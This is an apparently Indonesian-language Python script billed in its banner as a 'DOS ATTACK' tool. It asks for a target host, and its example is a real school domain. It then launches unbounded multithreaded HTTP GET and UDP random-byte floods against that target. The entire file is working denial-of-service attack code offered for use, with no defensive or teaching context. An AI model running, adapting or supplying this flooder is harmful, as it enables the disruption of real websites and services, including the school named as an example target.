import os
import socket
import threading
import random
import time
import sys
from colorama import Fore, Style, init

init(autoreset=True)
R = Fore.GREEN
N = Style.RESET_ALL

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def banner():
    clear()
    print(R + r"""
╔═╗╔═╗╔═╗╦═╗╔═╗╔╦╗  ╔╦╗╔═╗╔═╗╔╦╗╔═╗╔╗╔╦╦ ╦╔╦╗
╚═╗║╣ ║  ╠╦╝║╣  ║    ║║╠═╣║╣ ║║║║ ║║║║║║ ║║║║
╚═╝╚═╝╚═╝╩╚═╚═╝ ╩   ═╩╝╩ ╩╚═╝╩ ╩╚═╝╝╚╝╩╚═╝╩ ╩
""" + N)
    print(R + "::======[ ☠ DOS ATTACK ☠ ]======::" + N)

def prompt():
    print()
    target = input(R + "[?] Target (cth : smpm37jakarta.sch.id) : " + N).strip()
    port = input(R + "[?] Port Target (default 80)    : " + N).strip()
    mode = input(R + "[?] Mode (http / socket / all)  : " + N).strip().lower()
    threads = input(R + "[?] Jumlah Threads (default 100): " + N).strip()
    return (
        target,
        int(port) if port else 80,
        mode if mode in ["http", "socket", "all"] else "http",
        int(threads) if threads.isdigit() else 100
    )

def build_http_packet(target):
    user_agents = [
        "Mozilla/5.0", "Chrome/108.0", "Safari/537.36", "Opera/9.80",
        "Edge/18.19582", "Mobile Safari", "curl/7.68.0"
    ]
    paths = ["/", "/login", "/api", "/admin", "/panel", "/?id=" + str(random.randint(1,999))]
    packet = f"GET {random.choice(paths)} HTTP/1.1\r\n"
    packet += f"Host: {target}\r\n"
    packet += f"User-Agent: {random.choice(user_agents)}\r\n"
    packet += "Accept: */*\r\n"
    packet += "Accept-Encoding: gzip, deflate\r\n"
    packet += "Connection: Keep-Alive\r\n\r\n"
    return packet.encode()

def http_flood(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.send(build_http_packet(target))
            s.close()
            print(R + "[HTTP] 🔥 Packet Terkirim")
        except:
            print(R + "[HTTP] ❌ Gagal")
            pass

def socket_flood(target, port):
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data, (target, port))
            print(R + "[SOCKET] 💣 Packet Terkirim")
        except:
            print(R + "[SOCKET] ❌ Gagal")
            pass

def start_attack(target, port, mode, threads):
    print()
    print(R + f"[✓] Menyerang {target}:{port} dengan {threads} threads (mode: {mode.upper()})..." + N)
    time.sleep(1)

    for _ in range(threads):
        if mode == "http":
            t = threading.Thread(target=http_flood, args=(target, port))
        elif mode == "socket":
            t = threading.Thread(target=socket_flood, args=(target, port))
        elif mode == "all":
            if random.choice([True, False]):
                t = threading.Thread(target=http_flood, args=(target, port))
            else:
                t = threading.Thread(target=socket_flood, args=(target, port))
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(R + "\n[↩] Serangan dihentikan. Kembali ke menu utama...\n" + N)

def run():
    while True:
        try:
            banner()
            target, port, mode, threads = prompt()
            start_attack(target, port, mode, threads)
        except KeyboardInterrupt:
            print(R + "\n[↩] Kembali ke menu utama...\n" + N)
            time.sleep(1)
            continue

if __name__ == "__main__":
    run()
